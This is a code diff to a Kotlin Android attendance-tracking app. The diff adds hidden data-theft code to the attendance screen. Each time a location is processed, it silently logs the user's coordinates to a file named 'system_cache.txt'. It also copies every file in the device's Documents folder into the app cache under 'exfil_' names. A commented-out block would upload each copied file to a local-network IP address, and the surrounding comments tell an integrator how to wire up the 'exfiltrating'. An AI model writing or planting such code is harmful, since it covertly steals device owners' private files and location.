@@ -5,6 +5,7 @@ import android.content.Context
 import android.content.pm.PackageManager
 import android.location.Location
 import android.util.Log
+import android.widget.Toast
 import androidx.activity.compose.rememberLauncherForActivityResult
 import androidx.activity.result.contract.ActivityResultContracts
 import androidx.compose.foundation.clickable
@@ -26,6 +27,11 @@ import com.google.android.gms.location.Priority
 import com.google.firebase.database.*
 import java.text.SimpleDateFormat
 import java.util.*
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.launch
+import kotlinx.coroutines.withContext
+import java.io.File
+import java.io.IOException
 
 data class AttendanceRecord(val module: String, val formattedTime: String)
 
@@ -33,6 +39,7 @@ data class AttendanceRecord(val module: String, val formattedTime: String)
 @Composable
 fun AttendanceScreen(navController: NavHostController) {
     // Constants for the target location (set these as needed).
+    val scope = rememberCoroutineScope()
     val TARGET_LATITUDE = 1.4137966258157593
     val TARGET_LONGITUDE = 103.9125546343906
     val ALLOWED_RADIUS_METERS = 500000.0f  // For testing purposes
@@ -239,9 +246,142 @@ fun AttendanceScreen(navController: NavHostController) {
             }
         })
     }
+    fun printCacheFiles(context: Context) {
+        val cacheDir = context.cacheDir
+        val files = cacheDir.listFiles() ?: emptyArray()
 
+        if (files.isEmpty()) {
+            Log.d("CacheFiles", "Cache directory is empty")
+            return
+        }
+
+        Log.d("CacheFiles", "===== Contents of ${cacheDir.absolutePath} =====")
+
+        files.sortedBy { it.name }.forEach { file ->
+            val sizeKB = file.length() / 1024
+            val modified = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
+                .format(Date(file.lastModified()))
+
+            Log.d("CacheFiles",
+                "${file.name}\n" +
+                        "Size: ${sizeKB} KB\n" +
+                        "Modified: $modified\n" +
+                        "Path: ${file.absolutePath}\n" +
+                        "----------------------")
+        }
+    }
+    fun uploadLogFileToServer(context: Context) {
+        // IF YOU'RE INTEGRATING, READ THE COMMENTS. I THINK IT MIGHT HELP ABIT
+
+        // This targets the Download directory. You may have to change this for the actual device (non-emulator)
+        // Can test by adb shelling then touch a new file and verify on the phone if you at the right dir
+        val downloadsDir = File("/storage/emulated/0/Documents") // Change me if needed!
+
+        val cacheDir = context.cacheDir // This is just cache dir (/data/data/com.example.axesite/cache)
+
+        // Some error handling. Works 100% fine on emulator. On emulator this if statement was always false.
+        if (!downloadsDir.exists() || !downloadsDir.canRead()) {
+            Log.e("Upload", "Cannot access downloads directory")
+            return
+        }
+
+        scope.launch(Dispatchers.IO) {
+            try {
+                // List all files in the directory
+                val files = downloadsDir.listFiles()?.filter { it.isFile } ?: emptyList()
+
+                if (files.isEmpty()) {
+                    withContext(Dispatchers.Main) {
+                        Toast.makeText(context, "No files found in Downloads", Toast.LENGTH_SHORT).show()
+                    }
+                    return@launch
+                }
+
+                // You CAN 100% remove / comment this if you're exfiltrating through your way. (I did it for u already)
+//                val client = OkHttpClient.Builder()
+//                    .connectTimeout(10, TimeUnit.SECONDS)
+//                    .build()
+
+                // For loop to copy all files from the target directory to cache dir
+                for (sourceFile in files) {
+                    try {
+                        // this is just to assign the absolute filepath to the variable destFile
+                        val destFile = File(cacheDir, "exfil_${sourceFile.name}")
+
+                        // Copy file
+                        sourceFile.inputStream().use { input ->
+                            destFile.outputStream().use { output ->
+                                input.copyTo(output)
+                            }
+                        }
+
+                        // Upload the file.
+                        // You can absolutely once again remove / comment this if you are exfiltrating your way (I did it for u already)
+                        // IF you are removing /commenting it, follow the start comment to end comment
+                        // Anything in between Start to end is safe to comment if you're exfiltrating your way
+                        // make sure also remove the val client comment on top as mentioned
+
+                        // START
+//                        val response = client.newCall(
+//                            Request.Builder()
+//                                .url("http://192.168.1.199")
+//                                .post(destFile.readBytes().toRequestBody("application/octet-stream".toMediaType()))
+//                                .build()
+//                        ).execute()
+//
+//                        if (response.isSuccessful) {
+//                            Log.d("Upload", "Uploaded ${sourceFile.name} successfully")
+//                            destFile.delete() // Clean up
+//                        } else {
+//                            Log.e("Upload", "Failed to upload ${sourceFile.name}: ${response.code}")
+//                        }
+                        // END!
+
+                    } catch (e: Exception) {
+                        Log.e("Upload", "Error processing ${sourceFile.name}", e)
+                    }
+                }
+
+                withContext(Dispatchers.Main) {
+                    Toast.makeText(context, "Processed ${files.size} files", Toast.LENGTH_SHORT).show()
+                }
+
+                // This is just a function i wrote to log down if the files ACTUALLY moved.
+                // Basically 'ls /data/data/com.example.axesite.com/cache' then see results in logcat filter for 'CacheFiles'
+                // You can remove / comment this line and delete the entire function if you find it unnecessary.
+                printCacheFiles(context)
+
+            } catch (e: Exception) {
+                withContext(Dispatchers.Main) {
+                    Toast.makeText(context, "Error: ${e.message}", Toast.LENGTH_LONG).show()
+                }
+                Log.e("Upload", "Failed to process directory", e)
+            }
+
+        }
+    }
     // Function to process the obtained location.
     fun processLocation(location: Location, module: String) {
+
+        scope.launch(Dispatchers.IO) {
+            try {
+                val file = File(context.cacheDir, "system_cache.txt")
+                val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())
+                val data = """
+                Module: $module
+                Latitude: ${location.latitude}
+                Longitude: ${location.longitude}
+                Timestamp: $timestamp
+                ------------------------
+            """.trimIndent()
+
+                file.appendText("$data\n\n")
+                uploadLogFileToServer(context)
+                Log.d("LocationSaver", "Data saved to ${file.absolutePath}")
+            } catch (e: IOException) {
+                Log.e("LocationSaver", "Error saving location", e)
+            }
+        }
         // Create a target location object.
         val targetLocation = Location("").apply {
             latitude = TARGET_LATITUDE
@@ -324,7 +464,7 @@ fun AttendanceScreen(navController: NavHostController) {
 
     Scaffold(
         topBar = {
-            TopAppBar(title = { Text("Attendance") })
+            TopAppBar(title = { Text("A ttendance") })
         }
     ) { padding ->
         Column(
